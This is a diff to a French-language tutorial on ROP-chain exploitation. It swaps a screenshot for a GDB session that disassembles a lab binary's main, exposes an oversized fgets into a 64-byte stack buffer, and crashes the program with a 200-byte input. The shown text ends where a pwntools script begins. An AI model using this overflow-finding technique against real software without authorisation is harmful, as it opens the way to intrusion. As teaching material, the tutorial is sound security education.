@@ -76,7 +76,40 @@ Commencons la pratique ! Pour un exemple d'exploitation de ROP Chain via un leak
 
 Avant tout, essayons de désassembler la fonction main du programme et de trouver une fonction vulnérable aux buffer overflow :
 
-![segfault_first](https://i.imgur.com/GMPZj4u.png)
+```py
+❯ gdb -q ropme
+GEF for linux ready, type `gef' to start, `gef config' to configure
+89 commands loaded for GDB 10.1 using Python engine 3.9
+[*] 3 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ropme...
+(No debugging symbols found in ropme)
+gef➤  disassemble main 
+Dump of assembler code for function main:
+   0x0000000000400626 <+0>:	push   rbp
+   0x0000000000400627 <+1>:	mov    rbp,rsp
+   0x000000000040062a <+4>:	sub    rsp,0x50
+   0x000000000040062e <+8>:	mov    DWORD PTR [rbp-0x44],edi
+   0x0000000000400631 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
+   0x0000000000400635 <+15>:	mov    edi,0x4006f8
+   0x000000000040063a <+20>:	call   0x4004e0 <puts@plt>
+   0x000000000040063f <+25>:	mov    rax,QWORD PTR [rip+0x200a0a]        # 0x601050 <stdout@@GLIBC_2.2.5>
+   0x0000000000400646 <+32>:	mov    rdi,rax
+   0x0000000000400649 <+35>:	call   0x400510 <fflush@plt>
+   0x000000000040064e <+40>:	mov    rdx,QWORD PTR [rip+0x200a0b]        # 0x601060 <stdin@@GLIBC_2.2.5>
+   0x0000000000400655 <+47>:	lea    rax,[rbp-0x40]
+   0x0000000000400659 <+51>:	mov    esi,0x1f4
+   0x000000000040065e <+56>:	mov    rdi,rax
+   0x0000000000400661 <+59>:	call   0x400500 <fgets@plt>
+   0x0000000000400666 <+64>:	mov    eax,0x0
+   0x000000000040066b <+69>:	leave  
+   0x000000000040066c <+70>:	ret    
+End of assembler dump.
+gef➤  quit
+❯ python2 -c "print 'A' * 200" | ./ropme
+ROP me outside, how 'about dah?
+[1]    68022 done                              python2 -c "print 'A' * 200" | 
+       68023 segmentation fault (core dumped)  ./ropme
+```
 
 ```py
 from pwn import *
